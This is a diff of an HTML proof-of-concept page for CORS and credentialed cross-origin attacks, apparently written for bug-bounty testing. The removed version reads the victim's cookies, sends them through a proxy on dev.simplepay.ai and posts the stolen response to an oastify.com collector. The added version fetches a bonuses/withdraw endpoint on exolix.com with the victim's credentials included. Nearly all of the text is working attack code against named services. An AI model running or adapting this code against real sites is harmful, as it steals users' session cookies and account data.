@@ -1,44 +1,31 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit Test</title>
+</head>
 <body>
-   <script>
-      // Construct the POST request to the target proxy
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://dev.simplepay.ai/~scalar/proxy', true); 
-      xhr.setRequestHeader('Content-Type', 'application/json');  // The content type must match the expected by the target API
-      xhr.withCredentials = true;  // Ensures the victim's cookies are sent with the request
+    <h1>CORS Exploit in Action</h1>
+    <p id="result">Waiting for the response...</p>
 
-      // When the request completes, we send the response to the attacker's server
-      xhr.onreadystatechange = function() {
-         if (xhr.readyState == 4 && xhr.status == 200) {
-            // Send the target server's response to the attacker's server
-            fetch('https://lrgnxx0coh6ep0b4qq6vhmlq2h88wykn.oastify.com', {
-               method: 'POST',
-               headers: {
-                  'Content-Type': 'application/json'
-               },
-               body: JSON.stringify({
-                  response: xhr.responseText  // Send the response from the target server
-               })
-            });
-         }
-      };
+    <script>
+        // This is the malicious script that will attempt to make a request to the vulnerable server
+        const targetUrl = "https://exolix.com/api/v2/bonuses/withdraw"; // Replace with the actual target URL
 
-      // Construct the body of the malicious POST request
-      var body = {
-         method: "GET",
-         url: "https://api.simplepay.ai/app",
-         auth: {
-            type: "none"
-         },
-         headers: {
-            "Content-Type": "application/json",  
-            "Cookie": document.cookie  // Include the victim's cookies, including the sid cookie
-         }
-      };
-
-      // Send the malicious request to the proxy server
-      xhr.send(JSON.stringify(body));
-   </script>
+        fetch(targetUrl, {
+            method: 'GET',
+            credentials: 'include', // Sends cookies with the request
+        })
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById('result').innerText = 'Success! Response: ' + data;
+            console.log('Response data:', data);
+        })
+        .catch(error => {
+            document.getElementById('result').innerText = 'Failed to fetch data: ' + error;
+            console.error('Error:', error);
+        });
+    </script>
 </body>
 </html>
